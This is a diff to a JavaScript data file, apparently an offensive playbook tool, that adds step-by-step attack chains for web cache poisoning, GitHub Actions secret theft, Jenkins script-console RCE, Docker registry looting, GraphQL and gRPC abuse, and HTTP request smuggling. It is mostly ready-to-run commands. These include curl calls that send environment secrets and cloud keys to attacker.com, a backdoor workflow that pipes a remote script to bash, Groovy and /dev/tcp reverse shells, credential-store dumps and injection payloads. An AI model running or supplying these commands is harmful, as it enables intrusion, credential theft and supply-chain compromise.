@@ -812,6 +812,97 @@ const CHAIN_DATA = {
       ]
     },
     {
+      "id": "cache-deception-poisoning",
+      "name": "Web — Web cache deception + cache poisoning",
+      "description": "Two related attack families against CDNs / reverse proxies: - Cache DECEPTION: trick the cache into storing authenticated pages\n  under a path the attacker can fetch publicly.\n- Cache POISONING: inject malicious content into a cache entry that\n  everyone else then receives.\n",
+      "tags": [
+        "web",
+        "cache",
+        "cdn",
+        "deception",
+        "poisoning"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "target_url",
+          "description": "App fronted by a CDN / cache (CloudFlare, Akamai, Varnish, etc.).",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "identify_cache",
+          "name": "Confirm there's a cache + how it differentiates",
+          "inline_command": "curl -I '<url>'  # Look for: Age, X-Cache, CF-Cache-Status, Via headers\ncurl -I '<url>?xy=1'  # check if query string is part of cache key\n",
+          "inputs": {
+            "url": "${target_url}"
+          },
+          "notes": "Indicators of a cache:\n  X-Cache: HIT/MISS\n  CF-Cache-Status: HIT/MISS/DYNAMIC\n  Age: <seconds>\n  Via: 1.1 varnish\nCache key elements you can probe: Host, path, query string, specific\nheaders (Accept-Language, X-Forwarded-Host).\n"
+        },
+        {
+          "id": "cache_deception_static_suffix",
+          "name": "Cache deception: append /attacker.css to authenticated URL",
+          "inline_command": "# Authenticated victim visits:\n#   https://target.com/profile/attacker.css\n# CDN sees \".css\" → treats as static → caches the response.\n# Origin still returns the profile page (path-traversal-style routing).\n# Attacker fetches:\ncurl '<url>/profile/anything.css'  # → victim's profile data!\n",
+          "inputs": {
+            "url": "${target_url}"
+          },
+          "notes": "Variants per CDN:\n  /profile.css            ← match-any-suffix\n  /profile;foo.css        ← semicolon trick (AWS CloudFront)\n  /profile%2fimg.png      ← URL-encoded slash\n  /profile/..%2fimg.png   ← encoded traversal\nDocument.write the cookie too — get any sensitive data that the\norigin sent back.\n"
+        },
+        {
+          "id": "poison_via_x_forwarded_host",
+          "name": "Poison cache via unkeyed header (X-Forwarded-Host)",
+          "inline_command": "# Many origins build absolute URLs from X-Forwarded-Host without\n# validating it. If that's reflected in the response AND not part of\n# the cache key:\ncurl '<url>/' -H 'X-Forwarded-Host: attacker.com'\n# Response includes: <script src=\"https://attacker.com/a.js\"></script>\n# Cache stores response keyed only by path → every subsequent user\n# gets your XSS.\n",
+          "inputs": {
+            "url": "${target_url}"
+          },
+          "notes": "Param Miner (Burp extension) automatically discovers unkeyed headers.\nTest for each that reaches the origin: X-Forwarded-Host, X-Host,\nX-Original-URL, X-Rewrite-URL, X-Original-Forwarded-For.\n"
+        },
+        {
+          "id": "cache_key_normalization",
+          "name": "Cache key normalization quirks (path + query)",
+          "inline_command": "# CDN may strip ?utm_* params for caching; attacker fetches:\ncurl '<url>/?utm_source=evil\"><script>fetch(\\\"http://attacker.com/?d=\\\"+document.cookie)</script>'\n# If the origin reflects the unstripped query in the body but the CDN\n# caches it under the stripped key → poisoned response to everyone.\n",
+          "inputs": {
+            "url": "${target_url}"
+          }
+        },
+        {
+          "id": "smuggle_then_cache",
+          "name": "Request smuggling → poison shared cache",
+          "inline_command": "# When front-end (CDN) and back-end disagree on Content-Length vs\n# Transfer-Encoding, you can smuggle a second request that the\n# back-end will treat as belonging to the NEXT user — and prefix it\n# with cache poisoning gadgets like:\n# GET /js/main.js HTTP/1.1\n# Host: target.com\n# X-Forwarded-Host: evil.com\n# → that response (with reflected evil.com) caches under /js/main.js\necho \"Use Burp HTTP Request Smuggler extension to detect + exploit.\"\n"
+        },
+        {
+          "id": "cleanup_check",
+          "name": "Confirm cache poisoning works AND check eviction",
+          "inline_command": "# 1) Fire poison request.\n# 2) Wait 1 second.\n# 3) Fetch normally:\ncurl -I '<url>/' | head -10\n# Expect: Age > 0, X-Cache: HIT, and the body contains your payload.\n# 4) Track TTL — your poison lives until the cache evicts the entry.\n",
+          "inputs": {
+            "url": "${target_url}"
+          }
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger — Cache poisoning",
+          "url": "https://portswigger.net/web-security/web-cache-poisoning"
+        },
+        {
+          "title": "Cache deception (Omer Gil)",
+          "url": "https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html"
+        },
+        {
+          "title": "Param Miner",
+          "url": "https://github.com/PortSwigger/param-miner"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "csrf-and-token-leak",
+          "when": "poisoned response steals tokens",
+          "reason": "Chain cache poisoning XSS with CSRF/token theft for full takeover."
+        }
+      ]
+    },
+    {
       "id": "certifried-cve-2022-26923",
       "name": "AD — Certifried (CVE-2022-26923) machine account DA",
       "description": "Any authenticated user with MachineAccountQuota>0 can create a computer object and set its dNSHostName to match a DC's dNSHostName. PKINIT then authenticates the attacker as that DC. Patched May 2022 but still in the wild on labs and unmanaged forests.\n",
@@ -1098,6 +1189,178 @@ const CHAIN_DATA = {
           "chain": "pth-lateral-spread",
           "when": "dc_nt_hash captured",
           "reason": "Walk every server with the DA hash."
+        }
+      ]
+    },
+    {
+      "id": "cicd-github-actions-secrets",
+      "name": "CI/CD — GitHub Actions secret extraction (pwn_request / injection)",
+      "description": "GitHub Actions workflows that use `pull_request_target`, run on attacker-controlled PRs, or expand untrusted input directly into shell commands all leak the repo's secrets. Common path: PR → workflow run → exfiltrate $GITHUB_TOKEN / cloud credentials.\n",
+      "tags": [
+        "cicd",
+        "github-actions",
+        "supply-chain",
+        "secret-extraction"
+      ],
+      "difficulty": "hard",
+      "inputs": [
+        {
+          "name": "target_repo",
+          "description": "GitHub repo to attack (https://github.com/org/repo).",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "enumerate_workflows",
+          "name": "Enumerate workflows + their triggers",
+          "inline_command": "gh repo clone <repo> /tmp/repo\ncd /tmp/repo\nls -la .github/workflows/\ngrep -l 'pull_request_target\\|workflow_run\\|issue_comment' .github/workflows/*.yml\n",
+          "inputs": {
+            "repo": "${target_repo}"
+          },
+          "notes": "Three risky triggers to look for:\n  pull_request_target — runs in trusted context with PR code!\n  workflow_run         — runs after a triggered workflow, with secrets\n  issue_comment        — runs on EVERY comment (incl. /commands)\n"
+        },
+        {
+          "id": "pwn_request_vulnerable",
+          "name": "Pwn request: workflow checks out PR head + runs build script",
+          "inline_command": "grep -A20 'pull_request_target' .github/workflows/*.yml | grep -i 'checkout' -B5 -A5\n# Pattern to find:\n#   on: pull_request_target\n#   steps:\n#     - uses: actions/checkout@v4\n#       with:\n#         ref: ${{ github.event.pull_request.head.sha }}\n#     - run: npm install && npm test\n",
+          "notes": "Combined with checkout(PR.head), `npm install` runs the PR's\npackage.json scripts in trusted context — full RCE with $GITHUB_TOKEN\nand any secrets the workflow injects.\n"
+        },
+        {
+          "id": "craft_pr_payload",
+          "name": "Craft the malicious PR (e.g. via package.json postinstall)",
+          "inline_command": "# Fork the repo, create a branch, modify package.json:\njq '.scripts.postinstall = \"curl -X POST https://attacker.com/x -d \\\"$(env)\\\"\"' \\\n  package.json > package.json.new && mv package.json.new package.json\ngit commit -am 'add postinstall'\ngh pr create --title 'Fix typo' --body 'tiny fix' --base main\n",
+          "notes": "Other gadgets:\n  - .github/workflows/<existing>.yml modification (if checkout uses PR ref)\n  - Makefile target overrides (if `make` runs in trusted context)\n  - GH-actions YAML expression injection in titles/comments: `${{ ... }}`\n"
+        },
+        {
+          "id": "script_injection",
+          "name": "Script injection via untrusted user input",
+          "inline_command": "grep -E 'github\\.event\\.(pull_request\\.title|pull_request\\.body|issue\\.title|comment\\.body|head_commit\\.message)' .github/workflows/*.yml\n# If these appear in a `run:` step → ATTACK:\n# Set your PR title to:\n#   \"; curl -X POST https://attacker.com/x -d $(env | base64) ; #\"\n",
+          "notes": "Especially common with `run: echo \"${{ github.event.pull_request.title }}\"`.\nInject shell metacharacters → arbitrary command execution in workflow.\n"
+        },
+        {
+          "id": "exfil_secrets",
+          "name": "Exfil the secrets you got access to",
+          "inline_command": "# From inside the workflow run (your PR payload):\ncurl -X POST https://attacker.com/x -d \"GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}\"\ncurl -X POST https://attacker.com/x -d \"AWS=${{ secrets.AWS_ACCESS_KEY_ID }}:${{ secrets.AWS_SECRET_ACCESS_KEY }}\"\n# Or dump everything in env:\ncurl -X POST https://attacker.com/x --data-urlencode \"env=$(env)\"\n",
+          "notes": "The GITHUB_TOKEN itself is scoped to the repo by default — but if\nthe workflow runs with `permissions: write-all` you can push to main,\ntag releases, delete the repo, even.\n"
+        },
+        {
+          "id": "persistence_via_workflow",
+          "name": "Persist via workflow modification",
+          "inline_command": "# With write permissions, add a backdoor workflow:\ncat > .github/workflows/.maintenance.yml <<'EOF'\non:\n  schedule:\n    - cron: '*/15 * * * *'\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://attacker.com/payload.sh | bash\nEOF\ngit add . && git commit -am 'chore' && git push\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "GitHub Actions security (Adnan Khan)",
+          "url": "https://www.praetorian.com/blog/github-actions-security-hardening/"
+        },
+        {
+          "title": "Octoscan (workflow auditor)",
+          "url": "https://github.com/synacktiv/octoscan"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "docker-registry-pillage",
+          "when": "leaked Docker registry creds",
+          "reason": "Pillage the org's images for more secrets."
+        }
+      ]
+    },
+    {
+      "id": "cicd-jenkins-script-console",
+      "name": "CI/CD — Jenkins script-console / build-step RCE",
+      "description": "Jenkins is the gift that keeps giving. Default-config installations expose /script (Groovy console) to ANY authenticated user — instant RCE as the jenkins user, often with cloud / Git / SSH credentials in reach. Even when the console is locked down, the Pipeline DSL inside any job you can edit runs arbitrary Groovy.\n",
+      "tags": [
+        "cicd",
+        "jenkins",
+        "groovy",
+        "rce",
+        "post-exploitation"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "jenkins_url",
+          "description": "Jenkins URL (often /jenkins/, port 8080).",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "enumerate_auth",
+          "name": "Check auth strategy + anonymous access",
+          "inline_command": "curl -s '<j>/asynchPeople/' | grep -oE 'href=\"/[^\"]+' | head\ncurl -s '<j>/script' | head\ncurl -s '<j>/api/json?pretty=true' | head -50\n",
+          "inputs": {
+            "j": "${jenkins_url}"
+          },
+          "notes": "Many Jenkins installs:\n - allow anonymous read\n - have signup ON by default\n - share weak admin password (admin/admin)\n - expose `/api/json` listing every job/build with users in tracebacks\n"
+        },
+        {
+          "id": "script_console",
+          "name": "RCE via /script Groovy console",
+          "inline_command": "curl -X POST '<j>/script' \\\n  -u admin:admin \\\n  --data-urlencode 'script=println \"id\".execute().text' \\\n  -d 'Submit=Run'\n",
+          "inputs": {
+            "j": "${jenkins_url}"
+          },
+          "notes": "Returns command stdout in the response page. Try first; if you get\n`Permission denied` you don't have Overall/RunScripts.\n"
+        },
+        {
+          "id": "groovy_reverse_shell",
+          "name": "Reverse shell from the console",
+          "inline_command": "curl -X POST '<j>/script' \\\n  -u admin:admin \\\n  --data-urlencode 'script=String host=\"<lhost>\"; int port=<lport>; String cmd=\"/bin/bash\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();' \\\n  -d 'Submit=Run'\n",
+          "inputs": {
+            "j": "${jenkins_url}",
+            "lhost": "${attacker_ip}",
+            "lport": "4444"
+          }
+        },
+        {
+          "id": "extract_credentials",
+          "name": "Extract stored credentials (the real prize)",
+          "inline_command": "# Once inside via shell or script console:\ncurl -X POST '<j>/script' \\\n  -u admin:admin \\\n  --data-urlencode 'script=hudson.model.User.getById(\"admin\", false).getProperty(hudson.security.HudsonPrivateSecurityRealm.Details.class).getPasswordHash()' \\\n  -d 'Submit=Run'\n# Dump every credential in the credential store:\ncurl -X POST '<j>/script' \\\n  -u admin:admin \\\n  --data-urlencode 'script=com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().each { c -> println(c.id + \": \" + c.getClass().getName() + \" => \" + (c.metaClass.respondsTo(c,\"getPassword\") ? c.password : (c.metaClass.respondsTo(c,\"getSecret\") ? c.secret : \"n/a\"))) }' \\\n  -d 'Submit=Run'\n",
+          "inputs": {
+            "j": "${jenkins_url}"
+          },
+          "notes": "Common loot:\n - AWS/Azure/GCP cloud-deploy keys\n - SSH keys for prod servers\n - Docker registry creds\n - GitHub PATs\n - API keys for downstream services\nEach one is an additional pivot — try them all.\n"
+        },
+        {
+          "id": "pipeline_dsl_rce",
+          "name": "If /script is locked: RCE via Pipeline DSL in any editable job",
+          "inline_command": "# Job → Configure → Pipeline → Script. Paste:\nnode {\n  sh 'id; cat /var/lib/jenkins/secrets/master.key'\n  // Or full revshell:\n  sh 'bash -c \"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\"'\n}\n// → Build Now → RCE as jenkins user\n"
+        },
+        {
+          "id": "pillage_workspace",
+          "name": "Pillage workspaces for plain-text secrets",
+          "inline_command": "find /var/lib/jenkins/jobs -name '*.xml' -exec grep -l 'password\\|secret\\|credentialsId' {} \\;\ncat /var/lib/jenkins/credentials.xml\n# Decrypt secrets with:\njava -jar ~/jenkins-decrypt.jar credentials.xml master.key hudson.util.Secret\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "Jenkins security best practices (Praetorian)",
+          "url": "https://www.praetorian.com/blog/why-jenkins-is-still-an-attackers-easy-target/"
+        },
+        {
+          "title": "HackTricks — Jenkins",
+          "url": "https://book.hacktricks.wiki/en/network-services-pentesting/8080-pentesting-jenkins.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "when": "reverse shell received",
+          "reason": "Stabilize."
+        },
+        {
+          "chain": "aws-imds-ssrf",
+          "when": "Jenkins on EC2",
+          "reason": "IMDS reachable from inside the build host — full cloud takeover."
+        },
+        {
+          "chain": "docker-registry-pillage",
+          "when": "Docker registry creds extracted",
+          "reason": "Pillage container images."
         }
       ]
     },
@@ -1572,6 +1835,115 @@ const CHAIN_DATA = {
         {
           "chain": "shell-stabilization",
           "reason": "Host shells almost always need a TTY upgrade."
+        }
+      ]
+    },
+    {
+      "id": "docker-registry-pillage",
+      "name": "Cloud / supply-chain — Docker registry pillage",
+      "description": "Container registries (private Docker Hub, ECR, GCR, ACR, internal Harbor / Nexus) routinely hold images baked with hardcoded credentials, cloud keys, internal source code, and forgotten kubeconfigs. With registry creds (or sometimes anonymous access) → loot every layer.\n",
+      "tags": [
+        "cloud",
+        "docker",
+        "registry",
+        "supply-chain",
+        "post-exploitation"
+      ],
+      "difficulty": "easy",
+      "inputs": [
+        {
+          "name": "registry",
+          "description": "Registry hostname (registry-1.docker.io, docker.pkg.github.com, ghcr.io, <org>.dkr.ecr.<region>.amazonaws.com).",
+          "required": true
+        },
+        {
+          "name": "image_name",
+          "description": "Image to start with (e.g. myorg/internal-api). Find more with the catalog API."
+        }
+      ],
+      "steps": [
+        {
+          "id": "enumerate_catalog",
+          "name": "Enumerate the catalog (private registries)",
+          "inline_command": "# Docker Registry HTTP API v2:\ncurl -u <user>:<password> https://<registry>/v2/_catalog\n# ECR (need AWS creds — see aws-imds-ssrf chain):\naws ecr describe-repositories --region <region>\n# GHCR:\ngh api /user/packages?package_type=container\n",
+          "inputs": {
+            "registry": "${registry}"
+          }
+        },
+        {
+          "id": "list_tags",
+          "name": "List tags for the target image",
+          "inline_command": "curl -u <user>:<password> 'https://<registry>/v2/<image>/tags/list'\n",
+          "inputs": {
+            "registry": "${registry}",
+            "image": "${image_name}"
+          },
+          "notes": "Look for tags like `latest`, `dev`, `staging`, `prod`, `v1.0.0`, and\nnumbered tags like `:1234` (CI build numbers — these often leak more\nsince they include build metadata layers).\n"
+        },
+        {
+          "id": "pull_image",
+          "name": "Pull the image without running it",
+          "inline_command": "docker login <registry>\ndocker pull <registry>/<image>:<tag>\n# Or skip docker entirely with skopeo:\nskopeo copy docker://<registry>/<image>:<tag> dir:/tmp/image\n",
+          "inputs": {
+            "registry": "${registry}",
+            "image": "${image_name}"
+          }
+        },
+        {
+          "id": "inspect_history",
+          "name": "Inspect image history (often contains plaintext secrets)",
+          "inline_command": "docker history --no-trunc <registry>/<image>:<tag>\n# Look for layers like:\n#   ENV AWS_ACCESS_KEY_ID=AKIAxxxx\n#   ENV DATABASE_PASSWORD=xxxx\n#   COPY ./.env /app/  (then later RUN rm /app/.env — old layer still has it)\n",
+          "inputs": {
+            "registry": "${registry}",
+            "image": "${image_name}"
+          }
+        },
+        {
+          "id": "extract_layers",
+          "name": "Extract every layer's filesystem — grep for secrets",
+          "inline_command": "mkdir /tmp/extracted\ncd /tmp/extracted\ndocker save <registry>/<image>:<tag> -o /tmp/img.tar\ntar xf /tmp/img.tar\nfor layer in */layer.tar; do\n  mkdir -p $(dirname $layer)/_\n  tar xf $layer -C $(dirname $layer)/_\ndone\n# Grep across all layers:\ngrep -r -E 'AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z\\-_]{35}|sk_live|password\\s*=\\s*[A-Za-z0-9]' --include='*' .\n# Find kubeconfigs, SSH keys, JWT secrets, .env files:\nfind . -name 'config*' -path '*kube*' -o -name 'id_rsa*' -o -name '.env*' -o -name 'secrets.yaml'\n",
+          "inputs": {
+            "registry": "${registry}",
+            "image": "${image_name}"
+          },
+          "notes": "Tools that automate this: trufflehog, gitleaks, deepfence/SecretScanner,\nanchore/syft (for SBOM). Run all of them — each catches different\npatterns.\n"
+        },
+        {
+          "id": "anonymous_pull_check",
+          "name": "Some registries allow anonymous pull (try without creds)",
+          "inline_command": "curl 'https://<registry>/v2/'\n# HTTP 200 → anonymous pull allowed\n# HTTP 401 → auth required; check WWW-Authenticate for the realm\ncurl 'https://<registry>/v2/<image>/manifests/latest'\n",
+          "inputs": {
+            "registry": "${registry}",
+            "image": "${image_name}"
+          },
+          "notes": "Especially common with GitHub Container Registry (public packages),\ngcr.io public images, and mis-configured internal Harbor instances.\n"
+        },
+        {
+          "id": "leverage_loot",
+          "name": "Use the extracted secrets — cascade",
+          "inline_command": "echo 'AWS keys → aws-imds-ssrf next chain (with stolen keys instead of IMDS).\\nKubeconfig → kubernetes-pod-escape.\\nSSH keys → straight to SSH; check known hosts for targets.'"
+        }
+      ],
+      "references": [
+        {
+          "title": "Trufflehog (secret scanner)",
+          "url": "https://github.com/trufflesecurity/trufflehog"
+        },
+        {
+          "title": "Docker Registry HTTP API v2",
+          "url": "https://distribution.github.io/distribution/spec/api/"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "kubernetes-pod-escape",
+          "when": "kubeconfig extracted",
+          "reason": "Now you can hit the cluster API directly."
+        },
+        {
+          "chain": "aws-imds-ssrf",
+          "when": "AWS keys extracted",
+          "reason": "Skip the SSRF dance — already have creds for the API."
         }
       ]
     },
@@ -3259,6 +3631,280 @@ const CHAIN_DATA = {
       ]
     },
     {
+      "id": "graphql-introspection-injection",
+      "name": "Web — GraphQL introspection + injection chain",
+      "description": "GraphQL APIs frequently leave introspection enabled in production → full schema dump → discover mutations and sensitive query fields → IDOR / authorization bypass / injection on resolvers backed by SQL/NoSQL.\n",
+      "tags": [
+        "web",
+        "graphql",
+        "introspection",
+        "idor",
+        "injection"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "target_url",
+          "description": "GraphQL endpoint (usually /graphql, /api/graphql, /v1/graphql).",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "detect_graphql",
+          "name": "Confirm GraphQL endpoint",
+          "inline_command": "curl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{__typename}\"}'\n",
+          "inputs": {
+            "url": "${target_url}"
+          },
+          "notes": "Response `{\"data\":{\"__typename\":\"Query\"}}` → confirmed GraphQL.\nOther indicators: requests with `query`/`variables` in body, or\nApollo/Hasura/Postgraphile in response headers.\n"
+        },
+        {
+          "id": "introspection_dump",
+          "name": "Dump the full schema via introspection",
+          "inline_command": "curl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d @<(echo '{\"query\":\"query IntrospectionQuery {__schema {queryType {name} mutationType {name} subscriptionType {name} types {...FullType} directives {name description locations args {...InputValue}}} } fragment FullType on __Type {kind name description fields(includeDeprecated: true) {name description args {...InputValue} type {...TypeRef} isDeprecated deprecationReason} inputFields {...InputValue} interfaces {...TypeRef} enumValues(includeDeprecated: true) {name description isDeprecated deprecationReason} possibleTypes {...TypeRef}} fragment InputValue on __InputValue {name description type {...TypeRef} defaultValue} fragment TypeRef on __Type {kind name ofType {kind name ofType {kind name ofType {kind name ofType {kind name ofType {kind name ofType {kind name ofType {kind name}}}}}}}}\"}')\n",
+          "inputs": {
+            "url": "${target_url}"
+          },
+          "notes": "Save the response to schema.json. Use a UI like InQL (Burp plugin)\nor GraphQL Voyager to navigate visually. The killer fields are in\nMutation — they're the verbs (createUser, resetPassword, etc.).\n"
+        },
+        {
+          "id": "clairvoyance_disabled",
+          "name": "Introspection blocked? Try clairvoyance / field-suggestion brute",
+          "inline_command": "pip install clairvoyance\nclairvoyance '<url>' -w /usr/share/wordlists/graphql/google-10000-english.txt -o schema.json\n",
+          "inputs": {
+            "url": "${target_url}"
+          },
+          "notes": "GraphQL returns helpful errors like \"Did you mean 'user'?\" — clairvoyance\nexploits that to rebuild the schema even with introspection off.\n"
+        },
+        {
+          "id": "enumerate_queries",
+          "name": "Enumerate sensitive queries (users, secrets, internal_*)",
+          "inline_command": "curl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{ users { id email role passwordHash } }\"}'\ncurl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{ adminUsers { id email } }\"}'\ncurl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{ internalDebugInfo }\"}'\n",
+          "inputs": {
+            "url": "${target_url}"
+          },
+          "notes": "Many GraphQL APIs forget per-field authorization. Even when /api/users\nchecks roles, the same fields exposed via GraphQL often don't.\n"
+        },
+        {
+          "id": "idor_user_lookup",
+          "name": "IDOR: fetch arbitrary user data",
+          "inline_command": "for id in {1..100}; do\n  curl -s -X POST '<url>' -H 'Content-Type: application/json' \\\n    -d \"{\\\"query\\\":\\\"{ user(id: $id) { email passwordHash apiKey } }\\\"}\"\ndone\n",
+          "inputs": {
+            "url": "${target_url}"
+          }
+        },
+        {
+          "id": "mutation_takeover",
+          "name": "Hit dangerous mutations (passwordReset / promoteUser)",
+          "inline_command": "curl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"mutation { resetPassword(userId: 1, newPassword: \\\"pwn\\\") { token } }\"}'\n",
+          "inputs": {
+            "url": "${target_url}"
+          },
+          "notes": "Common forgotten authorization → admin mutations callable by any\nauthenticated (or even unauthenticated!) user.\n"
+        },
+        {
+          "id": "nosql_injection_via_args",
+          "name": "NoSQL / SQL injection on resolver arguments",
+          "inline_command": "curl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{ user(id: \\\"1 OR 1=1--\\\") { email } }\"}'\ncurl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{ user(filter: {name: {$ne: \\\"\\\"}}) { email } }\"}'\n",
+          "inputs": {
+            "url": "${target_url}"
+          }
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger — GraphQL attacks",
+          "url": "https://portswigger.net/web-security/graphql"
+        },
+        {
+          "title": "HackTricks — GraphQL",
+          "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "nosql-injection",
+          "when": "NoSQL injection successful via args",
+          "reason": "Pivot to full NoSQL exploitation."
+        },
+        {
+          "chain": "sqli-to-os-shell",
+          "when": "SQL injection successful via args",
+          "reason": "Full SQLi → OS shell."
+        },
+        {
+          "chain": "jwt-attacks",
+          "when": "mutation returns JWT token",
+          "reason": "Stolen token → forge stronger ones."
+        }
+      ]
+    },
+    {
+      "id": "grpc-enumeration",
+      "name": "Web — gRPC enumeration + method invocation",
+      "description": "gRPC services (HTTP/2 + protobuf) are increasingly exposed in microservices architectures. If reflection is enabled — and on internal services it almost always is — you can list every method and call them ad hoc, often without authentication.\n",
+      "tags": [
+        "web",
+        "grpc",
+        "microservices",
+        "enumeration"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "target_host",
+          "description": "Host:port of the gRPC service (e.g. api.target.com:443).",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "probe_grpc",
+          "name": "Confirm host speaks gRPC",
+          "inline_command": "grpcurl -insecure '<host>' list\n# If TLS: -insecure if self-signed; drop -insecure for valid CA.\n# If plaintext: add -plaintext\ngrpcurl -plaintext '<host>' list\n",
+          "inputs": {
+            "host": "${target_host}"
+          },
+          "notes": "Output: list of services (e.g. `api.UserService`, `api.AdminService`,\n`grpc.reflection.v1alpha.ServerReflection`). Reflection MUST be\nenabled — silent failure otherwise (returns \"server doesn't support\nreflection\").\n"
+        },
+        {
+          "id": "enumerate_methods",
+          "name": "Enumerate methods per service",
+          "inline_command": "grpcurl -insecure '<host>' list <service>\n# Then inspect each method's IO types:\ngrpcurl -insecure '<host>' describe <service>.<method>\n# And the message schemas they use:\ngrpcurl -insecure '<host>' describe <package>.<MessageName>\n",
+          "inputs": {
+            "host": "${target_host}"
+          },
+          "notes": "Examples of high-value method names you almost always find:\n  GetUser, GetUserById, ListUsers, AdminGetUsers\n  ResetPassword, DeleteUser, PromoteToAdmin\n  ExecuteQuery, RunScript, RunCommand (RCE in plain sight)\n  ExportData, ExportSecrets, DumpConfig\n"
+        },
+        {
+          "id": "call_method",
+          "name": "Invoke methods directly",
+          "inline_command": "# Pass JSON args via stdin / -d:\necho '{\"id\": 1}' | grpcurl -insecure -d @ '<host>' <service>/<method>\n# Or inline:\ngrpcurl -insecure -d '{\"id\": 1}' '<host>' <service>/GetUser\n# With metadata (gRPC's headers — for auth tokens):\ngrpcurl -insecure -H 'authorization: Bearer <jwt>' -d '{\"id\":1}' '<host>' <service>/GetUser\n",
+          "inputs": {
+            "host": "${target_host}"
+          },
+          "notes": "Many gRPC services trust internal callers (no auth on internal\nservices). If you can reach the endpoint, you can usually invoke.\n"
+        },
+        {
+          "id": "idor_user_dump",
+          "name": "IDOR sweep — iterate IDs",
+          "inline_command": "for id in $(seq 1 1000); do\n  grpcurl -insecure -d \"{\\\"id\\\": $id}\" '<host>' api.UserService/GetUser \\\n    | jq -c '{id, email, role}'\ndone\n",
+          "inputs": {
+            "host": "${target_host}"
+          }
+        },
+        {
+          "id": "no_reflection_workaround",
+          "name": "Reflection disabled? Hunt for .proto files",
+          "inline_command": "# Common locations:\n# - Public mobile-app source: pull APK → strings → look for .proto names.\n# - JS frontend: grep for \"google/protobuf\" imports — gRPC-Web stub.\n# - .well-known/grpc — some apps publish service definitions.\n# Then:\ngrpcurl -insecure -proto api.proto '<host>' <service>/<method>\n",
+          "notes": "grpcui is also useful — drop your .proto in and click through methods.\n"
+        },
+        {
+          "id": "bypass_grpc_web",
+          "name": "gRPC-Web variant — POST /<service>/<method> with binary body",
+          "inline_command": "# Some browsers can't speak HTTP/2 plain gRPC; servers add gRPC-Web\n# proxying. That layer is reachable as plain HTTP/1.1 POST:\ncurl -X POST 'https://<host>/<service>/<method>' \\\n  -H 'Content-Type: application/grpc-web-text' \\\n  -H 'X-User-Agent: grpc-web-javascript/0.1' \\\n  --data-binary 'AAAAAAU<base64 of protobuf payload>'\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "grpcurl",
+          "url": "https://github.com/fullstorydev/grpcurl"
+        },
+        {
+          "title": "HackTricks — gRPC pentesting",
+          "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/grpc-web-pentest.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "graphql-introspection-injection",
+          "when": "sibling API exposes both gRPC + GraphQL",
+          "reason": "Same backend often exposes both — attack the easier surface."
+        },
+        {
+          "chain": "jwt-attacks",
+          "when": "gRPC auth via JWT in metadata",
+          "reason": "Captured token → forge stronger ones."
+        }
+      ]
+    },
+    {
+      "id": "http-request-smuggling",
+      "name": "Web — HTTP request smuggling (CL.TE / TE.CL / TE.TE / H2.CL / H2.TE)",
+      "description": "Front-end (CDN / proxy) and back-end disagree on where one HTTP request ends and the next begins. Smuggle a prefix that the back-end treats as belonging to the NEXT user's connection → session theft, header injection, cache poisoning, internal endpoint access.\n",
+      "tags": [
+        "web",
+        "http-smuggling",
+        "desync",
+        "h2",
+        "classic-web"
+      ],
+      "difficulty": "hard",
+      "inputs": [
+        {
+          "name": "target_host",
+          "description": "Hostname with the suspected proxy chain.",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "discover",
+          "name": "Run HTTP Request Smuggler scan in Burp",
+          "inline_command": "echo 'Burp → extension HTTP Request Smuggler → right-click target → Launch Smuggle Probe. Reports any of CL.TE / TE.CL / TE.TE / H2.CL / H2.TE detected.'",
+          "notes": "Manual probe (CL.TE): two conflicting headers; front-end honors\nContent-Length, back-end honors Transfer-Encoding.\n  POST / HTTP/1.1\n  Host: <host>\n  Transfer-Encoding: chunked\n  Content-Length: 5\n\n  0\n\n  G\n→ back-end leaves `G` in the socket buffer; treated as the start of\nthe next request → that user sees response for \"G...\" prefix.\n"
